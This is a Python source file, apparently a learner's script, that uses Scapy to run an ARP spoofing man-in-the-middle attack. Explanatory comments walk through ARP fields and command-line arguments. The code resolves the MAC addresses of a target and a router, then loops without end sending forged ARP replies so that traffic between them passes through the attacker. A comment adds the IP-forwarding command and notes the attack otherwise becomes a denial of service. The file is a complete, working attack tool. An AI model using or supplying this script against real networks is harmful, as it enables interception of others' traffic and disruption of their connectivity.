# Notes from Scapy Terminal:
# pdst = Packet Destination IP Addr // hwdst = Destination Mac Addr
# psrc = Own IP Addr // hwsrc = Own Mac Addr
# op = 1 = sending ARP Request (Who has) // op = 2 = sending ARP Response (Is at)
# Create a packet to send to target machine, set op = 2 ,changing Target's Router's Mac Addr to our own Mac Addr

# Using srp(), get target MAC // hwsrc = Own MAC // psrc = Target Router IP [Pretending to be Router]
# Essentially telling Target "Your Router's MAC is the same as my MAC, send your packets to me"

# op=2 (Is At // Reply from target) -> Telling you this MAC is at that IP
# hwsrc = Own MAC // psrc = Target's Router's IP // hwdst = Target Mac // pdst = Target IP

########################################################################################################################

# Create packet to tell Target we are the Router
# Create packet to tell Router we are the Target

# sys.argv[2] Explanation: code is run with command "python3 ArpSpoofer.py xxx.xxx.xxx.xxx aaa.aaa.aaa.aaa"
# 1st Arg = ArpSpoofer.py [0] // 2nd Arg = xxx.xxx.xxx.xxx [1] // 3rd Arg = aaa.aaa.aaa.aaa [2]
# 1st Arg = Code // 2nd Arg = Target Router IP // 3rd Arg = Target IP
# targetIP = sys.argv[2] which is aaa.aaa.aaa.aaa

# ipAddr param is for either target or router IP
import scapy.all as scapy
import sys, time

def getMacAddr(ipAddr):
    broadcastLayer = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arpLayer = scapy.ARP(pdst=ipAddr)
    macPacket = broadcastLayer/arpLayer
    answer = scapy.srp(macPacket, timeout=2, verbose=False)[0]
    return answer[0][1].hwsrc

def spoof(routerIP, targetIP, routerMAC, targetMAC):
    routerPacket = scapy.ARP(op=2, hwdst=routerMAC, pdst=routerIP, psrc=targetIP) # psrc=targetIP because we want the router to think its coming from the target
    targetPacket = scapy.ARP(op=2, hwdst=targetMAC, pdst=targetIP, psrc=routerIP) # psrc = routerIP because we want the target to think its coming from the router

    scapy.send(targetPacket)
    scapy.send(routerPacket)

targetIP = str(sys.argv[2])
routerIP = str(sys.argv[1])

targetMAC = str(getMacAddr(targetIP))
routerMAC = str(getMacAddr(routerIP))

print(routerMAC)
print(targetMAC)

# spoof() has to be able to take all 4 param targetIP targetMAC routerIP routerMAC
# while True loop to continuously keep the ARP Table spoof-ed and prevent it from resetting

# !!! Before executing the code, write in the Terminal: echo 1 >> /proc/sys/net/ipv4/ip_forward , else the code acts like a DOS attack as the target won't be able to connect to the internet
try:
    while True:
        spoof(routerIP, targetIP, routerMAC, targetMAC)
        time.sleep(2) # Sleeping for 2 sec after every spoof so we don't send packets too fast

except KeyboardInterrupt:
    print('<!!> Closing ARP Spoofer')
    exit()





